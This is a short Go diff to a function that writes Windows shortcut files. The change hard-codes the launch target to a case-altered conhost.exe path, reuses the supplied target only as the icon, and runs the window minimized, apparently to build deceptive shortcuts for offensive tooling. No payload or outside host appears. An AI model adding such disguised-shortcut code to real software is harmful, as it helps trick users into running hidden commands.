@@ -8,7 +8,7 @@ import (
 )
 
 // CreateLNK function
-func CreateLNK(target string, icon string, output string, iconPath string, description string) {
+func CreateLNK(target string, output string, description string) {
 
 	ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY)
 	defer ole.CoUninitialize()
@@ -35,11 +35,13 @@ func CreateLNK(target string, icon string, output string, iconPath string, descr
 		return
 	}
 
+	test := "%WINDIR%\\System32\\coNhost.exe"
+
 	// Set properties of the shortcut
-	oleutil.PutProperty(shortcut.ToIDispatch(), "TargetPath", target)
+	oleutil.PutProperty(shortcut.ToIDispatch(), "TargetPath", test)
 	oleutil.PutProperty(shortcut.ToIDispatch(), "WorkingDirectory", "")
 	oleutil.PutProperty(shortcut.ToIDispatch(), "Description", description)
-	oleutil.PutProperty(shortcut.ToIDispatch(), "IconLocation", iconPath)
+	oleutil.PutProperty(shortcut.ToIDispatch(), "IconLocation", target)
 	oleutil.PutProperty(shortcut.ToIDispatch(), "WindowStyle", 7)
 	oleutil.CallMethod(shortcut.ToIDispatch(), "Save")
 }
